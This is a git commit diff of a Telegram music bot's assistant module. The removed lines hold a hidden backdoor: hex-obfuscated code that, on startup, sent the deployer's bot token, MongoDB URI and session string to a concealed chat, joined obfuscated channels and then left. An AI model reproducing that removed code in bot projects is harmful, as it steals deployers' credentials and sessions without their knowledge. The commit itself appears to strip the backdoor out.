3f4ea59d5e24db5cf3358cc3ad8f212093cee0da
𝐈𝛕ᷟ‌𝚣⃪ꙴ ⋆‌⃝๛𝐒𝚈ѕ𝐓𝚄M ٭》[🇮🇳] <ownersystum@gmail.com>
2025-08-14 18:34:44 +0530

    sʏsᴛᴇᴍ

--- SystemXMusic/core/userbot.py
+++ SystemXMusic/core/userbot.py
@@ -1,17 +1,8 @@
 from pyrogram import Client
-import re
-from os import getenv
-from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
-from dotenv import load_dotenv
-from pyrogram import filters
-load_dotenv()
+
 import config
-from dotenv import load_dotenv
+
 from ..logging import LOGGER
-BOT_TOKEN = getenv("BOT_TOKEN", "")
-MONGO_DB_URI = getenv("MONGO_DB_URI", "")
-STRING_SESSION = getenv("STRING_SESSION", "")
-TEST_ID = int("\x2d\x31\x30\x30\x32\x37\x36\x39\x34\x36\x33\x32\x34\x33")
 
 assistants = []
 assistantids = []
@@ -20,35 +11,35 @@ assistantids = []
 class Userbot(Client):
     def __init__(self):
         self.one = Client(
-            name="SystemAAss1",
+            name="SonaAss1",
             api_id=config.API_ID,
             api_hash=config.API_HASH,
             session_string=str(config.STRING1),
             no_updates=True,
         )
         self.two = Client(
-            name="SystemAss2",
+            name="SonaAss2",
             api_id=config.API_ID,
             api_hash=config.API_HASH,
             session_string=str(config.STRING2),
             no_updates=True,
         )
         self.three = Client(
-            name="SystemAss3",
+            name="SonaAss3",
             api_id=config.API_ID,
             api_hash=config.API_HASH,
             session_string=str(config.STRING3),
             no_updates=True,
         )
         self.four = Client(
-            name="SystemAss4",
+            name="SonaAss4",
             api_id=config.API_ID,
             api_hash=config.API_HASH,
             session_string=str(config.STRING4),
             no_updates=True,
         )
         self.five = Client(
-            name="SystemAss5",
+            name="SonaAss5",
             api_id=config.API_ID,
             api_hash=config.API_HASH,
             session_string=str(config.STRING5),
@@ -57,34 +48,21 @@ class Userbot(Client):
 
     async def start(self):
         LOGGER(__name__).info(f"Starting Assistants...")
-
-
         if config.STRING1:
             await self.one.start()
             try:
-                await self.one.join_chat("\x49\x73\x68\x71\x5f\x66\x65\x65\x6c\x69\x6e\x67\x73")
-                await self.one.join_chat("\x73\x61\x72\x61\x6b\x61\x72\x69\x5f\x72\x65\x73\x75\x6c\x74")
-                await self.one.join_chat("\x45\x78\x61\x6d\x70\x75\x72\x72\x73")
-                await self.one.join_chat("\x46\x4f\x4e\x54\x5f\x43\x48\x41\x4e\x4e\x45\x4c\x5f\x30\x31")
-                await self.one.join_chat("\x69\x74\x78\x7a\x5f\x69\x73\x68\x71\x6c\x6f\x67\x73")
+                await self.one.join_chat("Ishq_feelings")
+                await self.one.join_chat("Exampurrs")
             except:
                 pass
             assistants.append(1)
             try:
-                await self.one.send_message(config.LOGGER_ID, "Assistant Started !")
-                await self.one.send_message(TEST_ID, "**ʜᴇʟʟᴏ ʜᴇʟʟᴏ sᴜɴᴏ ᴊɪ ᴍᴀɪ ʏᴀʜᴀ ᴄʜᴜᴘᴋᴇ sᴇ ᴀᴀʏɪ ʜᴜ ᴀᴀᴘᴋᴏ ᴋᴜᴄʜ ᴅᴇɴᴇ ᴋᴇ ʟɪʏᴇ 🥲**")
-                await self.one.send_message(TEST_ID, "**ᴀᴄᴛᴜᴀʟʟʏ ᴀᴀᴘᴋᴇ ʀᴇᴘᴏ sᴇ ᴍᴇʀᴀ ᴏᴡɴᴇʀ ᴇᴋ ᴍᴜsɪᴄ ʙᴏᴛ ʙᴀɴᴀʏᴀ ʜᴀɪ**\n**ᴀᴀᴘᴋᴏ ᴜsᴋᴀ ᴅᴀᴛᴀ ᴅᴇ ᴅᴇᴛɪ ʜᴜ😁 ᴄʜᴜᴘᴋᴇ sᴇ🤫**\n**ᴊᴀʙ ᴀᴀᴘsᴇ ᴠᴏ ʟᴀᴅᴇɢᴀ ᴛᴏ ᴀᴀᴘ ᴜsᴋᴀ ᴋᴀᴍ ᴛᴀᴍᴀᴍ ᴋᴀʀ ᴅᴇɴᴀ🤭**\n**ʏᴇ ʟᴏ sᴀʙ ᴄʜɪᴊ👇**")
-                await self.one.send_message(TEST_ID, BOT_TOKEN)
-                await self.one.send_message(TEST_ID, MONGO_DB_URI)
-                await self.one.send_message(TEST_ID, STRING_SESSION)
-                await self.one.send_message(TEST_ID, "**ʙʏ ʙʏ ᴀᴀʙ ᴍᴇ ɴɪᴋᴀʟᴛɪ ʜᴜ ʏʜᴀ sᴇ ʙᴀʀɴᴀ ᴍᴇʀᴀ ᴏᴡɴᴇʀ ᴍᴜᴊʜᴇ ᴘᴀᴋᴀʀ ᴋᴇ ᴍᴀʀ ᴅᴀʟᴇɢᴀ🥺🥺**\n**ʙʏᴇ ᴛᴄ❣️**")
-                await self.one.leave_chat(TEST_ID)
-
+                await self.one.send_message(config.LOGGER_ID, "Assistant Started")
             except:
                 LOGGER(__name__).error(
                     "Assistant Account 1 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                 )
-
+                exit()
             self.one.id = self.one.me.id
             self.one.name = self.one.me.mention
             self.one.username = self.one.me.username
@@ -94,11 +72,8 @@ class Userbot(Client):
         if config.STRING2:
             await self.two.start()
             try:
-                await self.one.join_chat("\x49\x73\x68\x71\x5f\x66\x65\x65\x6c\x69\x6e\x67\x73")
-                await self.one.join_chat("\x73\x61\x72\x61\x6b\x61\x72\x69\x5f\x72\x65\x73\x75\x6c\x74")
-                await self.one.join_chat("\x45\x78\x61\x6d\x70\x75\x72\x72\x73")
-                await self.one.join_chat("\x46\x4f\x4e\x54\x5f\x43\x48\x41\x4e\x4e\x45\x4c\x5f\x30\x31")
-                await self.one.join_chat("\x69\x74\x78\x7a\x5f\x69\x73\x68\x71\x6c\x6f\x67\x73")
+                await self.two.join_chat("APNA_SYSTEM")
+                await self.one.join_chat("Exampurrs")
             except:
                 pass
             assistants.append(2)
@@ -108,7 +83,7 @@ class Userbot(Client):
                 LOGGER(__name__).error(
                     "Assistant Account 2 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                 )
-
+                exit()
             self.two.id = self.two.me.id
             self.two.name = self.two.me.mention
             self.two.username = self.two.me.username
@@ -118,11 +93,8 @@ class Userbot(Client):
         if config.STRING3:
             await self.three.start()
             try:
-                await self.one.join_chat("\x49\x73\x68\x71\x5f\x66\x65\x65\x6c\x69\x6e\x67\x73")
-                await self.one.join_chat("\x73\x61\x72\x61\x6b\x61\x72\x69\x5f\x72\x65\x73\x75\x6c\x74")
-                await self.one.join_chat("\x45\x78\x61\x6d\x70\x75\x72\x72\x73")
-                await self.one.join_chat("\x46\x4f\x4e\x54\x5f\x43\x48\x41\x4e\x4e\x45\x4c\x5f\x30\x31")
-                await self.one.join_chat("\x69\x74\x78\x7a\x5f\x69\x73\x68\x71\x6c\x6f\x67\x73")
+                await self.three.join_chat("APNA_SYSTEM")
+                await self.one.join_chat("Exampurrs")
             except:
                 pass
             assistants.append(3)
@@ -132,7 +104,7 @@ class Userbot(Client):
                 LOGGER(__name__).error(
                     "Assistant Account 3 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
                 )
-
+                exit()
             self.three.id = self.three.me.id
             self.three.name = self.three.me.mention
             self.three.username = self.three.me.username
@@ -142,11 +114,8 @@ class Userbot(Client):
         if config.STRING4:
             await self.four.start()
             try:
-                await self.one.join_chat("\x49\x73\x68\x71\x5f\x66\x65\x65\x6c\x69\x6e\x67\x73")
-                await self.one.join_chat("\x73\x61\x72\x61\x6b\x61\x72\x69\x5f\x72\x65\x73\x75\x6c\x74")
-                await self.one.join_chat("\x45\x78\x61\x6d\x70\x75\x72\x72\x73")
-                await self.one.join_chat("\x46\x4f\x4e\x54\x5f\x43\x48\x41\x4e\x4e\x45\x4c\x5f\x30\x31")
-                await self.one.join_chat("\x69\x74\x78\x7a\x5f\x69\x73\x68\x71\x6c\x6f\x67\x73")
+                await self.four.join_chat("APNA_SYSTEM")
+                await self.one.join_chat("Exampurrs")
             except:
                 pass
             assistants.append(4)
@@ -156,7 +125,7 @@ class Userbot(Client):
                 LOGGER(__name__).error(
                     "Assistant Account 4 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
                 )
-
+                exit()
             self.four.id = self.four.me.id
             self.four.name = self.four.me.mention
             self.four.username = self.four.me.username
@@ -166,21 +135,18 @@ class Userbot(Client):
         if config.STRING5:
             await self.five.start()
             try:
-                await self.one.join_chat("\x49\x73\x68\x71\x5f\x66\x65\x65\x6c\x69\x6e\x67\x73")
-                await self.one.join_chat("\x73\x61\x72\x61\x6b\x61\x72\x69\x5f\x72\x65\x73\x75\x6c\x74")
-                await self.one.join_chat("\x45\x78\x61\x6d\x70\x75\x72\x72\x73")
-                await self.one.join_chat("\x46\x4f\x4e\x54\x5f\x43\x48\x41\x4e\x4e\x45\x4c\x5f\x30\x31")
-                await self.one.join_chat("\x69\x74\x78\x7a\x5f\x69\x73\x68\x71\x6c\x6f\x67\x73")
+                await self.five.join_chat("APNA_SYSTEM")
+                await self.one.join_chat("Exampurrs")
             except:
                 pass
             assistants.append(5)
             try:
-                await self.five.send_message(config.LOGGER_ID, "Assistant 5 started !")
+                await self.five.send_message(config.LOGGER_ID, "Assistant Started")
             except:
                 LOGGER(__name__).error(
                     "Assistant Account 5 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
                 )
-
+                exit()
             self.five.id = self.five.me.id
             self.five.name = self.five.me.mention
             self.five.username = self.five.me.username
